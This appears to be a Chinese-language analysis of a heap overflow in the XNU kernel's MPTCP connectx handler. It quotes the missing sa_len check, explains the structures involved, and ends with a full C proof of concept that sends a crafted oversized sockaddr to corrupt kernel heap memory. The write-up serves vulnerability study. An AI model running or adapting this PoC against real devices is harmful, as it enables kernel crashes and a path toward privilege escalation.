# 漏洞分析

漏洞函数是mptcp_usr_connectx

漏洞原因是因为该函数没有正确处理当sockaddrs不是AF_INET或AF_INET6的情况

// verify sa_len for AF_INET:

	if (dst->sa_family == AF_INET &&
	    dst->sa_len != sizeof(mpte->__mpte_dst_v4)) {
		mptcplog((LOG_ERR, "%s IPv4 dst len %u\n", __func__,
			  dst->sa_len),
			 MPTCP_SOCKET_DBG, MPTCP_LOGLVL_ERR);
		error = EINVAL;
		goto out;
	}

// verify sa_len for AF_INET6:

	if (dst->sa_family == AF_INET6 &&
	    dst->sa_len != sizeof(mpte->__mpte_dst_v6)) {
		mptcplog((LOG_ERR, "%s IPv6 dst len %u\n", __func__,
			  dst->sa_len),
			 MPTCP_SOCKET_DBG, MPTCP_LOGLVL_ERR);
		error = EINVAL;
		goto out;
	}

函数只是简单的判断了dst->sa_family是否是AF_INET或AF_INET6的情况,对于不是AF_INET或AF_INET6的的情况，没有做判断

之后会执行的代码如下：

// code doesn't bail if sa_family was neither AF_INET nor AF_INET6

	if (!(mpte->mpte_flags & MPTE_SVCTYPE_CHECKED)) {
		if (mptcp_entitlement_check(mp_so) < 0) {
			error = EPERM;
			goto out;
		}

		mpte->mpte_flags |= MPTE_SVCTYPE_CHECKED;
	}

// memcpy with sa_len up to 255:

	if ((mp_so->so_state & (SS_ISCONNECTED|SS_ISCONNECTING)) == 0) {
		memcpy(&mpte->mpte_dst, dst, dst->sa_len);
	}

会往mpte->mpte_dst里复制从dst开始的dst->sa_len个字节

具体看看这三个参数都是什么

# mpte
mpte是个结构体

    struct mptses *mpte = NULL;

来自

    mpte = mptompte(mpp);

具体结构如下：

    /*
    * MPTCP Session
    *
    * This is an extension to the multipath PCB specific for MPTCP, protected by
    * the per-PCB mpp_lock (also the socket's lock);
    */
    struct mptses {
        struct mppcb	*mpte_mppcb;		/* back ptr to multipath PCB */
        struct mptcb	*mpte_mptcb;		/* ptr to MPTCP PCB */
        TAILQ_HEAD(, mptopt) mpte_sopts;	/* list of socket options */
        TAILQ_HEAD(, mptsub) mpte_subflows;	/* list of subflows */
        uint16_t	mpte_numflows;		/* # of subflows in list */
        uint16_t	mpte_nummpcapflows;	/* # of MP_CAP subflows */
        sae_associd_t	mpte_associd;		/* MPTCP association ID */
        sae_connid_t	mpte_connid_last;	/* last used connection ID */

        union {
            /* Source address of initial subflow */
            struct sockaddr	mpte_src;
            struct sockaddr_in __mpte_src_v4;
            struct sockaddr_in6 __mpte_src_v6;
        };

        union {
            /* Destination address of initial subflow */
            struct sockaddr	mpte_dst;
            struct sockaddr_in __mpte_dst_v4;
            struct sockaddr_in6 __mpte_dst_v6;
        };

        struct mptsub	*mpte_active_sub;	/* ptr to last active subf */
        uint8_t	mpte_flags;			/* per mptcp session flags */
    #define	MPTE_SND_REM_ADDR	0x01		/* Send Remove_addr option */
    #define	MPTE_SVCTYPE_CHECKED	0x02		/* Did entitlement-check for service-type */
    #define	MPTE_FIRSTPARTY		0x04		/* First-party app used multipath_extended entitlement */
    #define	MPTE_ACCESS_GRANTED	0x08		/* Access to cellular has been granted for this connection */
        uint8_t	mpte_svctype;			/* MPTCP Service type */
        uint8_t	mpte_lost_aid;			/* storing lost address id */
        uint8_t	mpte_addrid_last;		/* storing address id parm */

    #define	MPTE_ITFINFO_SIZE	4
        uint32_t	mpte_itfinfo_size;
        struct mpt_itf_info	_mpte_itfinfo[MPTE_ITFINFO_SIZE];
        struct mpt_itf_info	*mpte_itfinfo;

        struct mbuf		*mpte_reinjectq;

        /* The below is used for stats */
        uint32_t	mpte_subflow_switches;	/* Number of subflow-switches in sending */
        uint32_t	mpte_used_cell:1,
                mpte_used_wifi:1,
                mpte_initial_cell:1,
                mpte_handshake_success:1;

        struct mptcp_itf_stats	mpte_itfstats[MPTCP_ITFSTATS_SIZE];
        uint64_t		mpte_init_txbytes __attribute__((aligned(8)));
        uint64_t		mpte_init_rxbytes __attribute__((aligned(8)));
    };

mpte_dst是mpte结构体中代表Destination address的值，它是一个结构体

    struct sockaddr	mpte_dst;

sockaddr结构体具体如下：

    struct sockaddr {
            u_char	sa_len;
            u_char	sa_family;
            char	sa_data[14];
        };

# dst

dst是函数传入的参数，也是结构体sockaddr

    struct sockaddr *dst

dst->sa_len就是它里面表示结构体长度的值


# 漏洞成因

漏洞原因就是没有处理非AF_INET或AF_INET6的的情况，导致可以伪造一个非法的sockaddr结构，设置一个非AF_INET或AF_INET6的sa->family,以及设置sa->len为一个很大的值，那么就可以造成堆覆盖

# poc

这里看一下啤酒巨佬的poc

    #include <sys/socket.h>
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>
    #include <netinet/in.h>
    #include <unistd.h>

    #define AF_MULTIPATH 39

    int main() {
    int sock = socket(AF_MULTIPATH, SOCK_STREAM, 0);//
    if (sock < 0) {
        printf("socket failed\n");
        perror("");
        return 0;
    }
    printf("got socket: %d\n", sock);

    struct sockaddr* sockaddr_src = malloc(256);//申请一个sockaddr结构体作为源地址
    memset(sockaddr_src, 'A', 256);
    sockaddr_src->sa_len = 220;
    sockaddr_src->sa_family = 'B';
    
    struct sockaddr* sockaddr_dst = malloc(256);//申请一个sockaddr结构体作为目的地址
    memset(sockaddr_dst, 'A', 256);
    sockaddr_dst->sa_len = sizeof(struct sockaddr_in6);
    sockaddr_dst->sa_family = AF_INET6;

    sa_endpoints_t eps = {0};
    eps.sae_srcif = 0;
    eps.sae_srcaddr = sockaddr_src;
    eps.sae_srcaddrlen = 220;
    eps.sae_dstaddr = sockaddr_dst;
    eps.sae_dstaddrlen = sizeof(struct sockaddr_in6);

    int err = connectx(
        sock,
        &eps,
        SAE_ASSOCID_ANY,
        0,
        NULL,
        0,
        NULL,
        NULL);

    printf("err: %d\n", err);

    close(sock);

    return 0;
    }

